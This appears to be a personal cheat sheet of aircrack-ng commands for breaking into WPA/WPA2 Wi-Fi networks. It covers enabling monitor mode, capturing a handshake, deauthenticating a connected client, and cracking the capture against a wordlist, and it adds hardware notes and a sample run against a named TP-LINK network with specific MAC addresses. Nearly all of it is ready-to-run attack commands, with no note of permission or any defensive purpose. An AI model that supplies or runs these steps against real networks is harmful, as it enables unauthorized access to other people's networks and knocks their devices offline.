#ifconfig
airmon-ng check kill
ifconfig wlan0 down
#airrmon-ng start wlan0 (-r?)
airmon-ng start wlan0
airodump-ng mon0

iwconfig mon0 channel 3

airodump-ng mon0 -c [ChannelNo.] --bssid 00:00:00:00:00 -w airodump-ng

#aireplay-ng -0 2 -a [BSSID] -c [STATION] mon0
aireplay-ng -0 2 -a C8:E7:D8:08:6D:52 -c [STATION] mon0

aircrack-ng airodump-ng-01.cap -w psswd-aircrk-ng

#If you are using VMware, Virtual box, or any Virtual application you will need to use an external USB WIFI card capable of packet injection. The WIFI card I use with and without my VMware is listed bellow. 
#USE ctrl+c TO STOP THE PROGRAM AND GET YOUR COMMAND PROMPT BACK
#My Wireless card: Alfa Networks AWUSO36NHA
#to check if your card can do packet injection after creating the monitor mode interface open a terminal and type in:

aireplay-ng -9 mon0

#This will tell you your percentage of injection, OR check out 

http://www.aircrack-ng.org/doku.php?i...

http://www.aircrack-ng.org/doku.php?i...

WPA - WPA2 wordlist -- http://lmgtfy.com/?q=WPA+wordlist

SAMPLE:
sudo airodump-ng -c 7 -w ardmp-ng.ot --bssid 38:83:45:CA:47:B4 mon0

#Couldn't determine current channel for mon0, you should either force the operation with --ignore-negative-one or apply a kernel patch
Please specify an ESSID (-e)

sudo aireplay-ng --ignore-negative-one -0 2 -a 38:83:45:CA:47:B4 -c 88:CB:87:5C:B5:CD mon0 -e TP-LINK_CA47B4
aircrack-ng -w psswd-aircrk-ng -b 38:83:45:CA:47:B4 airodump-ng*.cap

